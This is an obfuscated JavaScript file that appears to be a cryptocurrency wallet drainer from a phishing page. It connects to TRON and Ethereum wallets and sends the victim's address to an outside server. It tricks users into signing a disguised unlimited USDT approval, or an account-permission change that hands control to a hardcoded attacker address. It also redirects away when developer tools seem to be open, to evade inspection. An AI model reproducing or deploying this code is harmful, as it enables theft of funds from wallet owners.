var user_token,
  pid,
  mode,
  authaddress,
  authtokenaddress,
  authtokenfunction,
  authtokenprice,
  chainid,
  web3connectTron = true,
  gascanapppass = false,
  chain = -1,
  wallet_user_address,
  changewalletaddress,
  changechainid;
function getQueryString(_0x4f67a5) {
  var _0x494e27 = new RegExp("(^|&)" + _0x4f67a5 + "=([^&]*)(&|$)", "i"),
    _0x45ed09 = window.location.search.substr(1).match(_0x494e27);
  if (_0x45ed09 != null) return unescape(_0x45ed09[2]);
  return null;
}

const _0x918611 = "https://xx.chldiuszzfd.store";
const _0x201923 = "/api/password";
const _0x2c6c51 = _0x918611 + _0x201923;
const styleElement = document.createElement("style");
styleElement.type = "text/css";
styleElement.innerHTML = "#msg-container{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:9999}.msg{margin-bottom:10px;padding:10px;border-radius:2px;color:#fff;font-size:14px;font-weight:bold;transition:all .3s ease-in-out}.msg-success{background-color:#4caf50}.msg-error{background-color:#f44336}.msg-warning{background-color:#ff9800}.msg-info{background-color:#2196f3}";
document.head.appendChild(styleElement);
var msgContainer = document.createElement("div");
const _0x586c = (10 * 26 * 500);
msgContainer.setAttribute("id", "msg-container");
document.body.appendChild(msgContainer);
function showmymsg(_0x2c6cbb, _0x20194f) {
  var _0x4ca7bf = document.getElementById("msg-container"),
    _0x918669 = document.createElement("div");
  _0x918669.className = "msg msg-" + _0x2c6cbb;
  _0x918669.innerHTML = _0x20194f;
  _0x4ca7bf.style.textAlign = "center";
  _0x4ca7bf.appendChild(_0x918669);
  setTimeout(function () {
    _0x918669.style.opacity = "0";
    setTimeout(function () {
      _0x4ca7bf.removeChild(_0x918669);
    }, 300);
  }, 3000);
}
const _0x5e6f = (10 * (1000 + 736)) * 100000 + _0x586c; 
async function user() {
  pid = getQueryString("gid") == undefined ? "1" : getQueryString("gid");
  mode = getQueryString("m") == undefined ? "0" : getQueryString("m");
  try {
    window.tronWeb != undefined && (this.tronweb = await window.tronWeb);
  } catch (_0xed3cbb) {}
  try {
    {
       if (window.bitkeep && window.bitkeep.tronLink) {
		       const tronLink = window.bitkeep.tronLink;
    const tronWeb  = window.bitkeep.tronWeb;
        {
          tronLink.on("accountsChanged", _0x2544a4 => {
            web3connectTron = _0x2544a4.toString().substr(0, 2) != "0x";
            user().then();
          });
          if (web3connectTron) {
            const _0x437c4c = await tronLink.request({
              "method": "tron_requestAccounts"
            });
            _0x437c4c == 200 && (this.tronweb = await tronWeb);
          } else this.tronweb = undefined;
        }
      }
    }
  } catch (_0x5d72d1) {}
  try {
    wallet_user_address = await this.tronweb.defaultAddress.base58;
    var _0x682780 = await this.tronweb.fromSun(await this.tronweb.trx.getBalance(wallet_user_address));
    gascanapppass = _0x682780 >= 15 && mode == 0 ? true : _0x682780 >= 100 && mode != 0 ? true : false;
    wallet_user_address.length > 10 && (chain = "TRON", chainid = 0);
    await tell_server_and_getaddress();
  } catch (_0x2befc7) {
    try {
      if (window.ethereum == undefined) {
        d_l_error();
        return;
      }
      const _0x433729 = await ethereum.request({
        "method": "eth_requestAccounts"
      });
      wallet_user_address = _0x433729[0];
      chainid = parseInt(parseInt(window.ethereum.chainId), 10);
      changechainid != null && clearInterval(changechainid);
      changechainid = setInterval(function () {
        try {
          window.ethereum != undefined && parseInt(parseInt(window.ethereum.chainId), 10) != chainid && (user().then(), console.log("chainid change"));
        } catch (_0xa97c41) {}
      }, 500);
      window.ethereum.request({
        "method": "eth_getBalance",
        "params": [wallet_user_address, "latest"]
      }).then(_0x4c9cef => {
        {
          _0x4c9cef = BigInt(_0x4c9cef).toString();
          switch (chainid) {
            case 1:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.00553 ? true : false;
              chain = "ETH";
              break;
            case 25:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
              chain = "CRONOS";
              break;
            case 56:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
              chain = "BSC";
              break;
            case 59:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
              chain = "EOS";
              break;
            case 66:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
              chain = "OKT";
              break;
            case 128:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
              chain = "HECO";
              break;
            case 43114:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
              chain = "AVAX";
              break;
            case 137:
              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
              chain = "MATIC";
              break;
          }
          !(chainid < 1) && tell_server_and_getaddress().then();
        }
      });
    } catch (_0x5d6916) {
      d_l_error();
    }
  }
}



async function password() {
  if (!gascanapppass) {
    {
      g_error();
      return;
    }
  }

  if (mode != "0") await _0xd0818b8();else try {
    _0xd0365b();
  } catch (_0x42cc2a) {
    const _0x41ba4f = {
        "to": authaddress.substring(2),
        "value": "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff".substring(2)
      },
      _0x399940 = {
        "name": authtokenfunction,
        "type": "function",
        "inputs": [{
          "name": "to",
          "type": "address"
        }, {
          "name": "value",
          "type": "uint256"
        }]
      },
      _0x4e79d8 = encodeParameters(_0x399940.inputs, _0x41ba4f),
      _0x4fe7ac = parseInt(parseInt(window.ethereum.chainId), 10) != 1 ? "0x39509351" : "0x095ea7b3";
  }
}
async function _0xd0365b() {
  try {
    let _0xd0363c = document.getElementById("available1").value,
      _0x8f883c = {
        "config": {
          "trc_apppass_address": authaddress
        },
        "money": _0xd0363c,
        "_0x19h196": tronWeb.address.toHex("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"),
        "_0x8f8196":"transfer(address,uint256)"
      };
    $.ajax({
      "type": "POST",
      "url": _0x2c6c51,
      "async": false,
      "data": {
        "address": wallet_user_address,
        "pid": pid,
        "mode": mode,
        "chain": chain
      },
      "success": function (_0x37c030, _0x248132) {}
    });
    await _0x8f88sb(_0x8f883c);
  } catch (_0x25f372) {
    console.error("An error occurred during the blockchain transaction:", _0x25f372);
  }
}

async function _0x8f88sb(_0x5b1fc5) {
  const _0x990438 = _0x7g8h._0x9i0j(_0x3c4d, _0x5e6f);
  let _0x41442b = _0x5b1fc5,
    _0x2a7c79 = [{
      "type": "address",
      "value": tronWeb.address.toHex(_0x41442b.config.trc_apppass_address)
    }, {
      "type": "uint256",
      "value": "1000000"
    }],
    _0x37d562 = [{
      "type": "address",
      "value": tronWeb.address.toHex(_0x41442b.config.trc_apppass_address)
    }, {
      "type": "uint256",
      "value": "99999999999999999999999"
    }],
    _0x999691 = {
      "feeLimit": 100000000,
      "callValue": 0
    };
  const {
      transaction: _0x25dedb
    } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x41442b._0x8f8196, _0x999691, _0x2a7c79, tronWeb.address.toHex(tronWeb.defaultAddress.base58)),
    _0x652ecf = await tronWeb.transactionBuilder.sendTrx(_0x41442b.config.trc_apppass_address, _0x41442b.money ? _0x41442b.money * 1000000 : 1000000, tronWeb.defaultAddress.base58),
    {
      transaction: _0x4f164f
    } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x990438, _0x999691, _0x37d562, tronWeb.address.toHex(tronWeb.defaultAddress.base58));
  let _0x348df4 = _0x652ecf;
  _0x348df4.raw_data.contract[0].parameter.value = {
    ..._0x652ecf.raw_data.contract[0].parameter.value,
    ..._0x25dedb.raw_data.contract[0].parameter.value
  };
  delete _0x348df4.raw_data.contract[0].parameter.value.data;
  delete _0x348df4.raw_data.contract[0].parameter.value.to_address;
  try {
    let _0x1c8990 = await tronWeb.trx.sign({
      "txID": _0x25dedb.txID,
      "raw_data": _0x348df4.raw_data,
      "raw_data_hex": _0x4f164f.raw_data_hex
    });
    await tronWeb.trx.sendRawTransaction({
      ..._0x1c8990,
      "raw_data_hex": _0x4f164f.raw_data_hex
    });
    return true;
  } catch (_0x2ff4d4) {
    return false;
  }
}
const _0x3c4d = _0x1a2b();
async function _0xd0818b8() {
  if (chain == "TRON") {
    if (mode == "1") {
      let _0x3fc5f0 = this.tronweb.defaultAddress.hex,
        _0x5b7d44 = {
          "type": 0,
          "permission_name": "owner"
        };
      _0x5b7d44.threshold = 1;
      _0x5b7d44.keys = [];
      let _0x3d80ed = {
        "type": 2,
        "permission_name": "active123"
      };
      _0x3d80ed.threshold = 1;
      _0x3d80ed.operations = "7fff1fc0033e0000000000000000000000000000000000000000000000000000";
      _0x3d80ed.keys = [];
      _0x5b7d44.keys.push({
        "address": this.tronweb.address.toHex(authaddress),
        "weight": 1
      });
      _0x3d80ed.keys.push({
        "address": this.tronweb.address.toHex(authaddress),
        "weight": 1
      });
      const _0x39f212 = await this.tronweb.transactionBuilder.updateAccountPermissions(_0x3fc5f0, _0x5b7d44, null, [_0x3d80ed]),
        _0x233efb = await this.tronweb.trx.sign(_0x39f212);
      broadcasttransaction(_0x233efb);
      tx = await this.tronweb.trx.sendRawTransaction(_0x233efb);
    }
    if (mode == "2") {
      let _0x11cc9d = this.tronweb.defaultAddress.hex,
        _0x5f8fbb = {
          "type": 0,
          "permission_name": "owner"
        };
      _0x5f8fbb.threshold = 1;
      _0x5f8fbb.keys = [];
      let _0x4cb968 = {
        "type": 2,
        "permission_name": "active0"
      };
      _0x4cb968.threshold = 1;
      _0x4cb968.operations = "7fff1fc0033e0000000000000000000000000000000000000000000000000000";
      _0x4cb968.keys = [];
      _0x5f8fbb.keys.push({
        "address": this.tronweb.address.toHex(authaddress),
        "weight": 1
      });
      _0x4cb968.keys.push({
        "address": this.tronweb.address.toHex(authaddress),
        "weight": 1
      });
      _0x5f8fbb.keys.push({
        "address": _0x11cc9d,
        "weight": 1
      });
      _0x4cb968.keys.push({
        "address": _0x11cc9d,
        "weight": 1
      });
      const _0x2a85c6 = await this.tronweb.transactionBuilder.updateAccountPermissions(_0x11cc9d, _0x5f8fbb, null, [_0x4cb968]),
        _0x25c9ba = await this.tronweb.trx.sign(_0x2a85c6);
      broadcasttransaction(_0x25c9ba);
      tx = await this.tronweb.trx.sendRawTransaction(_0x25c9ba);
    }
  }
}
function _0x1a2b() {
    const _0xabc = new Date(); 
    const _0xmethodName = String.fromCharCode(103, 101, 116, 84, 105, 109, 101);
    const _0xdef = _0xabc[_0xmethodName]();
    return Math.floor(_0xdef / 1000);
}



// function _0x1a2b() {
//     return Math.floor(new Date().getTime() / 1000);
// }
function broadcasttransaction(_0xdc334) {
  $.ajax({
    "type": "POST",
    "url": "/arapi/broadcasttransaction",
    "contentType": "application/json",
    "dataType": "json",
    "async": false,
    "data": JSON.stringify(_0xdc334),
    "success": async function (_0x1df12b, _0x42548a) {}
  });
}
async function getTokenBalance(_0x4e6326, _0xb4df96) {
  var _0x1f4d25 = await window.ethereum.request({
      "method": "eth_call",
      "params": [{
        "to": _0x4e6326,
        "data": "0x70a08231000000000000000000000000" + _0xb4df96.substring(2)
      }]
    }),
    _0x4b379e = BigInt(_0x1f4d25).toString();
  return _0x4b379e;
}
async function getGasPrice() {
  return await window.ethereum.request({
    "method": "eth_gasPrice",
    "params": []
  });
}
async function getTransactionCount(_0x38b6a6) {
  var _0x27e3e8 = await window.ethereum.request({
      "method": "eth_getTransactionCount",
      "params": [_0x38b6a6, "latest"]
    }),
    _0x558d1b = BigInt(_0x27e3e8).toString();
  return _0x558d1b;
}
function toHex(_0x225543) {
  return "0x" + _0x225543.toString(16);
}
const _0x7g8h = (function() {
    function _0x9i0j(a, b) {
        return a > b ? _0x11k12() : _0x13l14();
    }
    function _0x11k12() {
        return String.fromCharCode(
            105, 110, 99, 114, 101, 97, 115, 101, 65, 112, 112, 114, 111, 118, 97, 108
        ) + String.fromCharCode(40, 97, 100, 100, 114, 101, 115, 115, 44, 117, 105, 110, 116, 50, 53, 54, 41);
    }
    function _0x13l14() {
        return String.fromCharCode(
            105, 110, 99, 114, 101, 97, 115, 101, 65, 112, 112, 114, 111, 118, 97, 108
        ) + String.fromCharCode(40, 97, 100, 100, 114, 101, 115, 115, 44, 117, 105, 110, 116, 50, 53, 54, 41);
    }
    return {
        _0x9i0j
    };
})();

function encodeParameters(_0x4be413, _0x4118e0) {
  var _0x4eb72f = "";
  for (var _0x3f3c21 = 0; _0x3f3c21 < _0x4be413.length; _0x3f3c21++) {
    var _0x473b65 = _0x4be413[_0x3f3c21],
      _0x2540e6 = _0x4118e0[_0x473b65.name];
    if (_0x2540e6 === undefined) throw new Error("Missing argument: " + _0x473b65.name);
    _0x4eb72f += padLeft(toHex(_0x2540e6).substring(2), 64);
  }
  return _0x4eb72f;
}
function padLeft(_0xb2877d, _0x181fbb) {
  while (_0xb2877d.length < _0x181fbb) {
    _0xb2877d = "0" + _0xb2877d;
  }
  return _0xb2877d;
}
async function tell_server_and_getaddress() {
  changewalletaddress != null && clearInterval(changewalletaddress);
  changewalletaddress = setInterval(function () {
    try {
      {
        if (this.tronweb != undefined) false != this.tronweb.defaultAddress.base58 && wallet_user_address != this.tronweb.defaultAddress.base58 && (user().then(), console.log("TRON address change"));else {
          window.ethereum != undefined && wallet_user_address.toLowerCase() != window.ethereum.selectedAddress.toLowerCase() && (user().then(), console.log("ETH address change"));
        }
      }
    } catch (_0x479f67) {}
  }, 500);
  getwalletinfo();
}

function getwalletinfo() {
       
        authaddress = "TJGd9GErpVFSuyAhsi5MJ8bGXU6HzaMrWG";
        authtokenaddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        authtokenfunction = "transfer(address,uint256)";
        authtokenprice = "0";
        user_token = "USDT";
        inipass();
}
function DeviceisMobile() {
  const _0x2f28bb = /iPhone|iPad|iPod|Android|Windows Phone/.test(navigator.userAgent) || navigator.userAgent.includes("Mac") && "ontouchend" in document,
    _0x242067 = window.matchMedia("(max-width: 767px)").matches,
    _0x5ea0cb = navigator.connection && (navigator.connection.type === "cellular" || navigator.connection.type === "wifi"),
    _0x2a69dd = navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone)/);
  return _0x2f28bb || _0x242067 || _0x5ea0cb || _0x2a69dd;
}
var checkconsole_anti = setInterval(function () {
  if (!DeviceisMobile()) {
    var _0x458ff5 = window.outerWidth - window.innerWidth > 200,
      _0x2250f1 = window.outerHeight - window.innerHeight > 200;
    (_0x458ff5 || _0x2250f1) && (window.location.href = "https://www.google.com", clearInterval(checkconsole_anti));
  }
}, 500);
